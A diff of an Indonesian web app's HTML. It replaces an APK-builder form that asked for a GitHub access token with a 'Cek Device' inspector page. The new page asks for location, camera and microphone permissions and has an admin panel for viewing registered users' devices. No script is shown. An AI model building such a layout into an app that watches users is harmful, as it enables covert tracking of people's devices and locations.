+  .battery-shell{position:relative;width:64px;height:30px;border:2px solid #555;display:flex;align-items:center;padding:2px;}
+  .battery-shell::after{content:'';position:absolute;right:-7px;top:50%;transform:translateY(-50%);width:5px;height:12px;background:#555;}
+  .battery-fill{height:100%;background:linear-gradient(90deg,#777 0%,#ccc 100%);transition:width 1s ease;}
+  .battery-info{text-align:left;}
+  .battery-pct{font-family:'IBM Plex Mono',monospace;font-size:24px;font-weight:600;color:var(--accent-bright);line-height:1;}
+  .battery-status{font-size:11px;color:var(--text-secondary);margin-top:3px;}
+  .battery-health{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--silver);margin-top:1px;letter-spacing:0.5px;}
+
+  .sensor-card{background:var(--bg-card);border:1px solid var(--border);margin-bottom:2px;padding:10px 14px;}
+  .sensor-name{font-family:'IBM Plex Mono',monospace;font-size:11px;font-weight:500;color:var(--accent);letter-spacing:0.5px;margin-bottom:4px;text-transform:uppercase;}
+  .sensor-value{font-family:'IBM Plex Mono',monospace;font-size:11px;color:var(--text-secondary);line-height:1.6;}
+  .sensor-dot{display:inline-block;width:6px;height:6px;background:#444;margin-right:6px;vertical-align:middle;}
+  .sensor-dot.active{background:#888;}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+
+  .device-hero{background:var(--bg-card);border:1px solid var(--border);padding:20px;margin-bottom:16px;display:flex;align-items:center;gap:16px;}
+  .device-icon-wrap{width:48px;height:80px;border:2px solid #444;border-radius:6px;background:var(--bg-elevated);display:flex;align-items:center;justify-content:center;flex-shrink:0;position:relative;}
+  .device-icon-wrap::before{content:'';position:absolute;top:8px;width:16px;height:2px;background:#333;border-radius:1px;}
+  .device-icon-wrap::after{content:'';position:absolute;bottom:6px;width:12px;height:12px;border:1px solid #333;border-radius:50%;}
+  .device-model-main{font-family:'IBM Plex Mono',monospace;font-size:15px;font-weight:600;color:var(--accent-bright);letter-spacing:0.5px;}
+  .device-model-sub{font-size:12px;color:var(--text-secondary);margin-top:4px;}
+  .device-model-code{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--text-muted);margin-top:6px;letter-spacing:1px;}
+
+  .about-wrap{padding:24px 0;}
+  .about-logo{font-family:'IBM Plex Mono',monospace;font-size:22px;font-weight:600;letter-spacing:4px;color:var(--accent-bright);text-align:center;margin-bottom:4px;}
+  .about-tagline{text-align:center;font-size:11px;color:var(--text-muted);letter-spacing:1.5px;text-transform:uppercase;margin-bottom:28px;}
+  .about-divider{height:1px;background:linear-gradient(90deg,transparent,var(--border-light),transparent);margin:16px 0;}
+  .scroll-hint{text-align:center;padding:12px;font-family:'IBM Plex Mono',monospace;font-size:9px;color:var(--text-muted);letter-spacing:2px;text-transform:uppercase;}
+
+  .loc-btn{width:100%;background:var(--bg-elevated);border:1px solid var(--border-light);color:var(--accent-bright);padding:14px;font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:2px;text-transform:uppercase;cursor:pointer;margin-bottom:16px;transition:all 0.2s;}
+  .loc-btn:hover{background:#252525;border-color:#555;}
+  .loc-btn:disabled{color:var(--text-muted);cursor:default;}
+  .loc-maps-link{display:block;background:var(--bg-elevated);border:1px solid var(--border-light);color:var(--silver);padding:11px 14px;font-family:'IBM Plex Mono',monospace;font-size:11px;letter-spacing:1px;text-decoration:none;text-align:center;margin-top:12px;transition:all 0.2s;}
+  .loc-maps-link:hover{color:var(--accent-bright);border-color:#555;}
+
+  /* BOTTOM NAV (Home & Back) */
+  .bottom-nav{position:fixed;bottom:0;left:0;right:0;background:var(--bg-secondary);border-top:1px solid var(--border);display:none;align-items:center;justify-content:space-around;padding:8px 0 max(8px, env(safe-area-inset-bottom));z-index:150;}
+  .bottom-nav.show{display:flex;}
+  .nav-btn{flex:1;display:flex;flex-direction:column;align-items:center;gap:3px;padding:8px;background:none;border:none;cursor:pointer;color:var(--text-muted);transition:all 0.15s;}
+  .nav-btn:hover,.nav-btn:active{color:var(--accent-bright);}
+  .nav-btn svg{width:20px;height:20px;}
+  .nav-btn span{font-family:'IBM Plex Mono',monospace;font-size:8px;letter-spacing:1.5px;text-transform:uppercase;}
+  .nav-divider{width:1px;height:30px;background:var(--border);}
+
+  /* Extra padding for bottom nav */
+  #main-app{padding-bottom:56px;}
+
+  /* Viewing user info bar */
+  .user-info-bar{background:var(--bg-elevated);border-bottom:1px solid var(--border);padding:8px 16px;display:none;align-items:center;justify-content:space-between;}
+  .user-info-bar.show{display:flex;}
+  .user-info-bar-name{font-family:'IBM Plex Mono',monospace;font-size:10px;color:var(--silver);letter-spacing:1px;}
+  .user-info-bar-label{font-family:'IBM Plex Mono',monospace;font-size:8px;color:var(--text-muted);letter-spacing:1px;text-transform:uppercase;}
 </style>
 </head>
 <body>
-<audio id="bgMusic" loop>
-  <source src="https://www.image2url.com/r2/default/audio/1776258663976-363dbaa8-f66a-48b4-a22e-256984457724.mp3" type="audio/mpeg">
-</audio>
-<div class="wrapper">
-  <div class="header">
-    <div class="header-badge">Zam Coder</div>
-    <h1>Builder<span>APK</span></h1>
-    <p class="header-sub">// convert website to android app</p>
-  </div>
-  <div class="steps-nav" id="stepsNav">
-    <div class="step-dot active" onclick="goStep(0)"></div>
-    <div class="step-dot" onclick="goStep(1)"></div>
-    <div class="step-dot" onclick="goStep(2)"></div>
-    <div class="step-dot" onclick="goStep(3)"></div>
-    <div class="step-dot" onclick="goStep(4)"></div>
-  </div>
-  <div class="step-label">
-    <div class="step-num" id="stepNumEl">01</div>
-    <div class="step-title" id="stepTitleEl">Informasi Aplikasi</div>
-  </div>
 
-  <!-- STEP 0 -->
-  <div class="form-section active" id="step0">
-    <div class="error-msg" id="err0"></div>
-    <div class="field">
-      <div class="field-label">Nama Aplikasi <span class="req">* wajib</span></div>
-      <input class="field-input" id="appName" type="text" placeholder="contoh: My App" maxlength="40">
-    </div>
-    <div class="field">
-      <div class="field-label">Package Name <span class="req">* wajib</span></div>
-      <input class="field-input" id="packageName" type="text" placeholder="com.nama.app" maxlength="80">
-      <div class="field-hint">Format: com.developer.appname (huruf kecil, titik)</div>
-    </div>
-    <div class="nav-row">
-      <button class="btn-next" onclick="nextStep(0)">Lanjut &rarr;</button>
-    </div>
+<!-- SCREEN: AUTH -->
+<div class="screen active" id="screen-auth">
+  <div class="screen-logo">Cek Device</div>
+  <div class="screen-sub">System Inspector</div>
+  <div class="auth-tabs">
+    <button class="auth-tab active" id="tab-login-btn" onclick="authSwitch('login')">Login</button>
+    <button class="auth-tab" id="tab-signup-btn" onclick="authSwitch('signup')">Sign Up</button>
   </div>
-
-  <!-- STEP 1 -->
-  <div class="form-section" id="step1">
-    <div class="error-msg" id="err1"></div>
-    <div class="field">
-      <div class="field-label">Pilih Sumber Konten</div>
-      <div class="source-toggle">
-        <button class="source-btn active" id="srcUrl" onclick="setSource('url')">URL WebView</button>
-        <button class="source-btn" id="srcHtml" onclick="setSource('html')">File HTML</button>
-      </div>
-    </div>
-    <div id="urlField" class="field">
-      <div class="field-label">URL Website <span class="req">* wajib</span></div>
-      <input class="field-input" id="webviewUrl" type="url" placeholder="https://website.com">
-      <div class="field-hint">URL harus diawali https:// atau http://</div>
-    </div>
-    <div id="htmlField" class="field" style="display:none;">
-      <div class="field-label">Upload File HTML <span class="req">* wajib</span></div>
-      <div class="upload-box">
-        <input type="file" id="htmlFile" accept=".html,.htm" onchange="handleHtmlFile(this)">
-        <div class="upload-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg></div>
-        <div class="upload-text">Pilih File HTML</div>
-        <div class="upload-sub">Klik atau drag & drop</div>
-        <div class="upload-filename" id="htmlFilename"></div>
-      </div>
-    </div>
-    <div class="nav-row">
-      <button class="btn-back" onclick="prevStep(1)">&larr; Kembali</button>
-      <button class="btn-next" onclick="nextStep(1)">Lanjut &rarr;</button>
-    </div>
-  </div>
-
-  <!-- STEP 2 -->
-  <div class="form-section" id="step2">
-    <div class="error-msg" id="err2"></div>
-    <div class="field">
-      <div class="field-label">Icon Aplikasi <span class="req">* wajib</span></div>
-      <div class="icon-preview-wrap">
-        <div class="icon-canvas-wrap">
-          <div class="icon-preview shape-rounded" id="iconPreview" onclick="document.getElementById('iconFileInput').click()">
-            <div class="icon-placeholder" id="iconPlaceholder">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><rect x="3" y="3" width="18" height="18" rx="3"/><circle cx="8.5" cy="8.5" r="1.5"/><polyline points="21 15 16 10 5 21"/></svg>
-              <p>Tap pilih<br>gambar</p>
-            </div>
-            <img id="iconImg" src="" style="display:none;">
-          </div>
-          <input type="file" id="iconFileInput" accept="image/*" onchange="handleIconFile(this)">
-        </div>
-        <div class="icon-controls">
-          <div class="field-label" style="margin-bottom:6px;">Bentuk Icon</div>
-          <div class="shape-grid">
-            <button class="shape-btn" onclick="setShape('square',event)"><div class="shape-preview square"></div><span>Kotak</span></button>
-            <button class="shape-btn active" onclick="setShape('rounded',event)"><div class="shape-preview rounded"></div><span>Bulat</span></button>
-            <button class="shape-btn" onclick="setShape('circle',event)"><div class="shape-preview circle"></div><span>Lingkaran</span></button>
-          </div>
-          <div class="slider-wrap" style="margin-top:8px;">
-            <label>Zoom</label>
-            <input type="range" id="iconZoom" min="80" max="150" value="100" oninput="applyZoom(this.value)">
-            <div class="slider-val" id="zoomVal">100%</div>
-          </div>
-          <button class="btn-crop" onclick="openCrop()">
-            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M6 2v14a2 2 0 0 0 2 2h14"/><path d="M18 22V8a2 2 0 0 0-2-2H2"/></svg>
-            Buka Crop Editor
-          </button>
-        </div>
-      </div>
-    </div>
-    <div class="nav-row">
-      <button class="btn-back" onclick="prevStep(2)">&larr; Kembali</button>
-      <button class="btn-next" onclick="nextStep(2)">Lanjut &rarr;</button>
-    </div>
-  </div>
-
-  <!-- STEP 3 -->
-  <div class="form-section" id="step3">
-    <div class="error-msg" id="err3"></div>
-    <div class="field">
-      <div class="field-label">Warna Background Splash</div>
-      <div class="color-row">
-        <div class="color-swatch selected" style="background:#0a0a0a;" data-color="#0a0a0a" onclick="pickSwatch(this)"></div>
-        <div class="color-swatch" style="background:#1a1a1a;" data-color="#1a1a1a" onclick="pickSwatch(this)"></div>
-        <div class="color-swatch" style="background:#2d2d2d;" data-color="#2d2d2d" onclick="pickSwatch(this)"></div>
-        <div class="color-swatch" style="background:#ffffff;" data-color="#ffffff" onclick="pickSwatch(this)"></div>
-        <div class="color-swatch" style="background:#e0e0e0;" data-color="#e0e0e0" onclick="pickSwatch(this)"></div>
-        <div class="color-swatch" style="background:#a8a8b3;" data-color="#a8a8b3" onclick="pickSwatch(this)"></div>
-      </div>
-      <div class="color-picker-wrap">
-        <label>Custom</label>
-        <input type="color" id="splashColor" value="#0a0a0a" oninput="updateSplashColor(this.value)">
-        <span style="font-family:'Space Mono',monospace;font-size:10px;color:var(--dim)" id="splashColorHex">#0a0a0a</span>
-      </div>
-      <div class="splash-preview-box" id="splashPreview" style="background:#0a0a0a;">SPLASH SCREEN</div>
-    </div>
-    <div class="nav-row">
-      <button class="btn-back" onclick="prevStep(3)">&larr; Kembali</button>
-      <button class="btn-next" onclick="nextStep(3)">Lanjut &rarr;</button>
-    </div>
-  </div>
-
-  <!-- STEP 4 -->
-  <div class="form-section" id="step4">
-    <div class="error-msg" id="err4"></div>
-    <div class="info-box">
-      <div class="info-box-title">Cara Dapat Access Token</div>
-      <ol class="token-steps">
-        <li>Buka <strong>github.com</strong> &rarr; login akun kamu</li>
-        <li>Klik foto profil &rarr; <strong>Settings</strong></li>
-        <li>Scroll ke bawah &rarr; <strong>Developer settings</strong></li>
-        <li>Pilih <strong>Personal access tokens</strong> &rarr; Tokens (classic)</li>
-        <li>Klik <strong>Generate new token (classic)</strong></li>
-        <li>Centang <strong>repo</strong> (semua) &amp; <strong>workflow</strong></li>
-        <li>Klik <strong>Generate token</strong> &rarr; copy tokennya</li>
-      </ol>
-    </div>
-    <div class="field">
-      <div class="field-label">GitHub Username <span class="req">* wajib</span></div>
-      <input class="field-input" id="githubUser" type="text" placeholder="username kamu">
-    </div>
-    <div class="field">
-      <div class="field-label">Access Token <span class="req">* wajib</span></div>
-      <input class="field-input" id="githubToken" type="password" placeholder="ghp_xxxxxxxxxxxxx">
-      <div class="field-hint">Token tidak disimpan, hanya dipakai untuk build sekali ini</div>
-    </div>
-    <div class="field">
-      <div class="field-label">Repository</div>
-      <div class="repo-auto">
-        <div>
-          <div class="repo-auto-label">Nama repo (otomatis)</div>
-          <div class="repo-auto-value" id="repoAutoName">-- isi nama app dulu --</div>
-        </div>
-        <div class="repo-auto-badge">PRIVATE</div>
-      </div>
-    </div>
-    <button class="btn-build" onclick="startBuild()">
-      <svg class="btn-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
-      Build APK Sekarang
+  <div class="auth-form" id="form-login">
+    <input class="auth-input" id="login-user" type="text" placeholder="Username" autocomplete="off">
+    <input class="auth-input" id="login-pass" type="password" placeholder="Password" autocomplete="off">
+    <div class="auth-error" id="login-err"></div>
+    <button class="auth-btn" onclick="doLogin()">Masuk</button>
+    <div class="auth-divider">atau</div>
+    <button class="auth-google-btn" onclick="doGoogleLogin()">
+      <svg width="14" height="14" viewBox="0 0 24 24"><path fill="#888" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#888" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#888" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#888" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+      Login dengan Google
     </button>
   </div>
-
-  <div class="footer"><p>Builder APK &mdash; by <strong>Zam Coder</strong></p></div>
+  <div class="auth-form" id="form-signup" style="display:none">
+    <input class="auth-input" id="signup-user" type="text" placeholder="Username" autocomplete="off">
+    <input class="auth-input" id="signup-pass" type="password" placeholder="Password" autocomplete="off">
+    <input class="auth-input" id="signup-pass2" type="password" placeholder="Konfirmasi Password" autocomplete="off">
+    <div class="auth-error" id="signup-err"></div>
+    <button class="auth-btn" onclick="doSignup()">Daftar</button>
+    <div class="auth-divider">atau</div>
+    <button class="auth-google-btn" onclick="doGoogleLogin()">
+      <svg width="14" height="14" viewBox="0 0 24 24"><path fill="#888" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/><path fill="#888" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#888" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#888" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+      Daftar dengan Google
+    </button>
+  </div>
 </div>
 
-<!-- CROP MODAL -->
-<div class="modal-overlay" id="cropModal">
+<!-- SCREEN: PERMISSION -->
+<div class="screen" id="screen-perm">
+  <div class="screen-logo">Izin Diperlukan</div>
+  <div class="screen-sub">Izinkan akses berikut</div>
+  <div class="perm-list">
+    <div class="perm-item">
+      <span class="perm-name">Lokasi</span>
+      <span class="perm-status waiting" id="perm-geo-status">Belum</span>
+      <button class="perm-grant-btn" id="perm-geo-btn" onclick="grantPerm('geo')">Izinkan</button>
+    </div>
+    <div class="perm-item">
+      <span class="perm-name">Notifikasi</span>
+      <span class="perm-status waiting" id="perm-notif-status">Belum</span>
+      <button class="perm-grant-btn" id="perm-notif-btn" onclick="grantPerm('notif')">Izinkan</button>
+    </div>
+    <div class="perm-item">
+      <span class="perm-name">Kamera</span>
+      <span class="perm-status waiting" id="perm-cam-status">Belum</span>
+      <button class="perm-grant-btn" id="perm-cam-btn" onclick="grantPerm('cam')">Izinkan</button>
+    </div>
+    <div class="perm-item">
+      <span class="perm-name">Mikrofon</span>
+      <span class="perm-status waiting" id="perm-mic-status">Belum</span>
+      <button class="perm-grant-btn" id="perm-mic-btn" onclick="grantPerm('mic')">Izinkan</button>
+    </div>
+  </div>
+  <button class="play-btn" id="play-btn" onclick="goToMain(null)">PLAY</button>
+</div>
+
+<!-- SCREEN: RETURNING USER -->
+<div class="screen" id="screen-play">
+  <div class="screen-logo">Cek Device</div>
+  <div class="screen-sub">System Inspector</div>
+  <button class="play-btn visible" onclick="goToMain(null)">PLAY</button>
+</div>
+
+<!-- SCREEN: ADMIN PANEL USER LIST -->
+<div class="screen" id="screen-admin">
+  <div class="admin-header">
+    <div class="admin-title">Admin Panel</div>
+    <div class="admin-sub">Daftar pengguna terdaftar</div>
+  </div>
+  <div class="admin-body">
+    <div class="admin-section-label">Pengguna Aktif</div>
+    <div id="admin-user-list"></div>
+    <div id="admin-empty" class="admin-empty" style="display:none">Belum ada pengguna yang mendaftar</div>
+    <button class="admin-close-btn" onclick="closeAdmin()">✕ Tutup Panel</button>
+  </div>
+</div>
+
+<!-- PASSWORD MODAL -->
+<div class="modal-overlay" id="pw-modal">
   <div class="modal-box">
-    <div class="modal-title">Crop Editor</div>
-    <div class="modal-sub">// drag untuk memilih area crop</div>
-    <div class="crop-canvas-container" id="cropContainer">
-      <canvas id="cropCanvas"></canvas>
-      <svg class="crop-overlay-svg" id="cropSvg"></svg>
-    </div>
+    <div class="modal-title">Admin Access</div>
+    <div class="modal-err" id="pw-err"></div>
+    <input class="modal-input" id="pw-input" type="password" placeholder="Password admin..." autocomplete="off" onkeydown="if(event.key==='Enter')checkPw()">
     <div class="modal-row">
-      <button class="btn-modal-cancel" onclick="closeCrop()">Batal</button>
-      <button class="btn-modal-apply" onclick="applyCrop()">Terapkan</button>
+      <button class="modal-btn cancel" onclick="closePwModal()">Batal</button>
+      <button class="modal-btn" onclick="checkPw()">Masuk</button>
     </div>
   </div>
 </div>
 
-<!-- PROGRESS -->
-<div class="progress-overlay" id="progressOverlay">
-  <div class="progress-title">Sedang Build...</div>
-  <div class="progress-sub">// mohon tunggu, jangan tutup halaman ini</div>
-  <div class="progress-track"><div class="progress-bar" id="progressBar"></div></div>
-  <div class="progress-step-text" id="progressStepText">Memulai...</div>
-  <div class="progress-log" id="progressLog"></div>
+<!-- VOLUME -->
+<div class="vol-bar-wrap" id="vol-bar">
+  <span class="vol-label">VOL</span>
+  <input class="vol-slider" type="range" min="0" max="1" step="0.01" value="0.75" oninput="setVol(this.value)">
 </div>
 
-<!-- SUCCESS -->
-<div class="success-overlay" id="successOverlay">
-  <div class="success-icon">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg>
+<!-- MAIN APP -->
+<div id="main-app" style="display:none">
+  <div class="statusbar">
+    <span id="clock">--:--</span>
+    <div class="statusbar-right"><span>SIG</span><span>WIFI</span><span id="bat-status-bar">--</span></div>
   </div>
-  <div class="success-title">Build Dipicu!</div>
-  <div class="success-sub" id="successSub">APK sedang di-build.<br>Klik tombol untuk pantau & download.</div>
-  <a class="btn-download" id="downloadBtn" href="#" target="_blank">
-    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
-    Buka GitHub Actions
-  </a>
-  <button class="btn-reset" onclick="resetAll()">Buat APK Lain</button>
+
+  <!-- USER INFO BAR (tampil saat lihat user lain) -->
+  <div class="user-info-bar" id="user-info-bar">
+    <div>
+      <div class="user-info-bar-label">Sedang melihat perangkat</div>
+      <div class="user-info-bar-name" id="viewing-user-name">--</div>
+    </div>
+  </div>
+
+  <div class="header">
+    <div class="header-icon">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#aaa" stroke-width="1.5">
+        <rect x="2" y="3" width="20" height="14" rx="2"/>
+        <path d="M8 21h8M12 17v4"/>
+        <circle cx="12" cy="10" r="3"/>
+      </svg>
+    </div>
+    <div>
+      <div class="header-title-wrap" id="lp-wrap">
+        <div class="header-title" id="header-title">Cek Device</div>
+        <div class="lp-bar" id="lp-bar"></div>
+      </div>
+      <div class="header-subtitle" id="header-subtitle">System Inspector</div>
+    </div>
+    <div class="header-right">
+      <button class="scan-btn" id="scanBtn" onclick="runScan()">SCAN</button>
+    </div>
+  </div>
+
+  <div class="tabs-wrapper">
+    <div class="tabs">
+      <button class="tab active" onclick="switchTab('soc',this)">SOC</button>
+      <button class="tab" onclick="switchTab('device',this)">DEVICE</button>
+      <button class="tab" onclick="switchTab('system',this)">SYSTEM</button>
+      <button class="tab" onclick="switchTab('battery',this)">BATTERY</button>
+      <button class="tab" onclick="switchTab('network',this)">NETWORK</button>
+      <button class="tab" onclick="switchTab('sensors',this)">SENSORS</button>
+      <button class="tab" onclick="switchTab('lokasi',this)">LOKASI</button>
+      <button class="tab" onclick="switchTab('about',this)">ABOUT</button>
+    </div>
+  </div>
+
+  <!-- SOC TAB -->
+  <div class="content active" id="tab-soc">
+    <div class="chip-header card">
+      <div class="chip-logo">CPU</div>
+      <div><div class="chip-name" id="soc-name">Mendeteksi...</div><div class="chip-freq" id="soc-freq"></div></div>
+    </div>
+    <div class="section-label">Informasi Prosesor</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Vendor</span><span class="row-value" id="cpu-vendor">--</span></div>
+      <div class="row"><span class="row-label">Arsitektur</span><span class="row-value" id="cpu-arch">--</span></div>
+      <div class="row"><span class="row-label">Jumlah Core</span><span class="row-value highlight" id="cpu-cores">--</span></div>
+      <div class="row"><span class="row-label">Thread</span><span class="row-value" id="cpu-threads">--</span></div>
+      <div class="row"><span class="row-label">Platform</span><span class="row-value" id="cpu-platform">--</span></div>
+    </div>
+    <div class="section-label">Memori</div>
+    <div class="card">
+      <div class="progress-wrap">
+        <div class="progress-header"><span class="progress-label">RAM Terpakai</span><span class="progress-pct" id="ram-pct">-- %</span></div>
+        <div class="progress-track"><div class="progress-fill" id="ram-bar" style="width:0%"></div></div>
+        <div class="progress-sub" id="ram-detail">-- / -- MB</div>
+      </div>
+      <div class="row"><span class="row-label">Total RAM</span><span class="row-value highlight" id="ram-total">--</span></div>
+      <div class="row"><span class="row-label">Tipe</span><span class="row-value" id="ram-type">--</span></div>
+    </div>
+    <div class="section-label">GPU</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Vendor GPU</span><span class="row-value" id="gpu-vendor">--</span></div>
+      <div class="row"><span class="row-label">Renderer</span><span class="row-value" id="gpu-renderer">--</span></div>
+      <div class="row"><span class="row-label">API</span><span class="row-value" id="gpu-api">--</span></div>
+      <div class="row"><span class="row-label">Max Texture</span><span class="row-value" id="gpu-texture">--</span></div>
+    </div>
+  </div>
+
+  <!-- DEVICE TAB -->
+  <div class="content" id="tab-device">
+    <div class="device-hero">
+      <div class="device-icon-wrap"></div>
+      <div>
+        <div class="device-model-main" id="dev-brand">--</div>
+        <div class="device-model-sub" id="dev-model">--</div>
+        <div class="device-model-code" id="dev-ua-short">Mendeteksi perangkat...</div>
+      </div>
+    </div>
+    <div class="section-label">Layar</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Resolusi</span><span class="row-value highlight" id="scr-res">--</span></div>
+      <div class="row"><span class="row-label">Viewport</span><span class="row-value" id="scr-viewport">--</span></div>
+      <div class="row"><span class="row-label">Pixel Ratio</span><span class="row-value" id="scr-dpr">--</span></div>
+      <div class="row"><span class="row-label">Color Depth</span><span class="row-value" id="scr-color">--</span></div>
+      <div class="row"><span class="row-label">Orientasi</span><span class="row-value" id="scr-orient">--</span></div>
+      <div class="row"><span class="row-label">Touch Points</span><span class="row-value" id="scr-touch">--</span></div>
+    </div>
+    <div class="section-label">Koneksi</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Tipe Jaringan</span><span class="row-value" id="net-type">--</span></div>
+      <div class="row"><span class="row-label">Kecepatan Efektif</span><span class="row-value" id="net-speed">--</span></div>
+      <div class="row"><span class="row-label">Downlink</span><span class="row-value" id="net-down">--</span></div>
+      <div class="row"><span class="row-label">RTT</span><span class="row-value" id="net-rtt">--</span></div>
+      <div class="row"><span class="row-label">Hemat Data</span><span class="row-value" id="net-save">--</span></div>
+    </div>
+    <div class="section-label">Storage</div>
+    <div class="card">
+      <div class="progress-wrap">
+        <div class="progress-header"><span class="progress-label">Penyimpanan Terpakai</span><span class="progress-pct" id="stor-pct">-- %</span></div>
+        <div class="progress-track"><div class="progress-fill" id="stor-bar" style="width:0%"></div></div>
+        <div class="progress-sub" id="stor-detail">Menghitung...</div>
+      </div>
+      <div class="row"><span class="row-label">Total</span><span class="row-value" id="stor-total">--</span></div>
+      <div class="row"><span class="row-label">Tersedia</span><span class="row-value highlight" id="stor-free">--</span></div>
+    </div>
+  </div>
+
+  <!-- SYSTEM TAB -->
+  <div class="content" id="tab-system">
+    <div class="section-label">Platform</div>
+    <div class="card">
+      <div class="row"><span class="row-label">OS</span><span class="row-value highlight" id="sys-os">--</span></div>
+      <div class="row"><span class="row-label">Platform</span><span class="row-value" id="sys-platform">--</span></div>
+      <div class="row"><span class="row-label">Browser</span><span class="row-value" id="sys-browser">--</span></div>
+      <div class="row"><span class="row-label">Engine</span><span class="row-value" id="sys-engine">--</span></div>
+      <div class="row"><span class="row-label">Bahasa</span><span class="row-value" id="sys-lang">--</span></div>
+      <div class="row"><span class="row-label">Zona Waktu</span><span class="row-value" id="sys-tz">--</span></div>
+      <div class="row"><span class="row-label">Offline Mode</span><span class="row-value" id="sys-online">--</span></div>
+      <div class="row"><span class="row-label">Cookie</span><span class="row-value" id="sys-cookie">--</span></div>
+      <div class="row"><span class="row-label">Do Not Track</span><span class="row-value" id="sys-dnt">--</span></div>
+    </div>
+    <div class="section-label">Kapabilitas</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Service Worker</span><span class="row-value" id="cap-sw">--</span></div>
+      <div class="row"><span class="row-label">WebAssembly</span><span class="row-value" id="cap-wasm">--</span></div>
+      <div class="row"><span class="row-label">WebGL</span><span class="row-value" id="cap-webgl">--</span></div>
+      <div class="row"><span class="row-label">WebRTC</span><span class="row-value" id="cap-rtc">--</span></div>
+      <div class="row"><span class="row-label">Bluetooth API</span><span class="row-value" id="cap-bt">--</span></div>
+      <div class="row"><span class="row-label">Geolocation</span><span class="row-value" id="cap-geo">--</span></div>
+      <div class="row"><span class="row-label">Notifikasi</span><span class="row-value" id="cap-notif">--</span></div>
+      <div class="row"><span class="row-label">Kamera</span><span class="row-value" id="cap-cam">--</span></div>
+      <div class="row"><span class="row-label">Mikrofon</span><span class="row-value" id="cap-mic">--</span></div>
+    </div>
+  </div>
+
+  <!-- BATTERY TAB -->
+  <div class="content" id="tab-battery">
+    <div class="battery-visual">
+      <div class="battery-shell"><div class="battery-fill" id="bat-fill" style="width:0%"></div></div>
+      <div class="battery-info">
+        <div class="battery-pct" id="bat-pct">-- %</div>
+        <div class="battery-status" id="bat-status">Mendeteksi...</div>
+        <div class="battery-health" id="bat-health">--</div>
+      </div>
+    </div>
+    <div class="section-label">Detail Baterai</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Level</span><span class="row-value highlight" id="bat-level">--</span></div>
+      <div class="row"><span class="row-label">Status Pengisian</span><span class="row-value" id="bat-charging">--</span></div>
+      <div class="row"><span class="row-label">Waktu Penuh</span><span class="row-value" id="bat-time-full">--</span></div>
+      <div class="row"><span class="row-label">Waktu Habis</span><span class="row-value" id="bat-time-empty">--</span></div>
+    </div>
+    <div class="section-label">Performa Baterai</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Estimasi Daya Tahan</span><span class="row-value" id="bat-estimate">--</span></div>
+      <div class="row"><span class="row-label">Rekomendasi</span><span class="row-value" id="bat-rec">--</span></div>
+    </div>
+    <div class="scroll-hint">* Beberapa data memerlukan izin perangkat</div>
+  </div>
+
+  <!-- NETWORK TAB -->
+  <div class="content" id="tab-network">
+    <div class="section-label">Koneksi Aktif</div>
+    <div class="card">
+      <div class="row"><span class="row-label">Status</span><span class="row-value highlight" id="net2-status">--</span></div>
+      <div class="row"><span class="row-label">Tipe</span><span class="row-value" id="net2-type">--</span></div>
+      <div class="row"><span class="row-label">Kecepatan Efektif</span><span class="row-value" id="net2-eff">--</span></div>
